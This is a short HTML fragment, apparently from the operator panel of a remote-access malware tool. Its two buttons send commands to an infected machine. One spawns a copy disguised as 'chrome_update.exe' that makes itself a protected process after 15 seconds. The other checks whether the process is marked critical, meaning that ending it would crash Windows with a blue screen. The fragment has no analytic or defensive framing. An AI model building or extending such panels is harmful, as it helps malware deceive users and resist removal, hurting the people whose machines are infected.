...
<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('PROTECT_PROCESS')">🔒 Spawn Protected Copy <span>Launch chrome_update.exe that auto-protects after 15s</span></button>
...
<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('CHECK_PROTECTION')">🛡️ Check Protection <span>Query if this process is critical (no BSOD)</span></button>
</div>
</div>
</div>
